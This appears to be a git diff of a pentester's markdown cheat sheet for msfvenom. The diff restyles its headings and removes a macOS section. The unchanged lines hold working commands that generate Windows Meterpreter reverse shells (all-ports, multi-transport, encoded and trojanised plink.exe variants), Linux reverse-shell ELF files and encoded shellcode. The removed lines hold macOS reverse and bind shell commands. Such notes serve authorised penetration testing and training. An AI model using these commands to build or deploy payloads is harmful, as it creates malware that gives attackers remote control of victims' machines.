@@ -1,6 +1,6 @@
 # ⭕ msfvenom
 
-## reverse all port payload
+## <mark style="color:red;">reverse all port payload</mark>
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp_allports lhost=192.168.56.1 lport=6969  --platform windows exitfunc=thread -a x86  -f exe >reverse_all.exe
@@ -10,7 +10,7 @@ set payload windows/meterpreter/reverse_tcp_allports
 
 lport is the starting port which can also be set to 1 so it will go all the way to 65535 in both payload and the
 
-## multi-transport payload
+## <mark style="color:red;">multi-transport payload</mark>
 
 in AddTransports.ps1 :
 
@@ -26,7 +26,7 @@ The command line for this would be:
 msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
 ```
 
-## custom payload
+## <mark style="color:red;">custom payload</mark>
 
 ​​this is a chained command -- enter it one line at a time
 
@@ -50,7 +50,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.234 LPORT=443 R | \
 msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -t exe -c --platform windows /usr/share/windows-binaries/plink.exe -o beffany.exe
 ```
 
-## Linux
+## <mark style="color:red;">Linux</mark>
 
 Linux Meterpreter reverse shell x86 multi stage
 
@@ -76,7 +76,7 @@ Linux reverse shell x64 single stage
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf 
 ```
 
-## Windows
+## <mark style="color:red;">Windows</mark>
 
 Windows Meterpreter reverse shell
 
@@ -132,21 +132,9 @@ Bad characters fnstenv\_mov
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"
 ```
 
-## MAC
 
-Mac Reverse Shell
 
-```
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
-```
-
-Mac Bind shell
-
-```
-msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
-```
-
-## Other Languages
+## <mark style="color:red;">Other Languages</mark>
 
 python
 
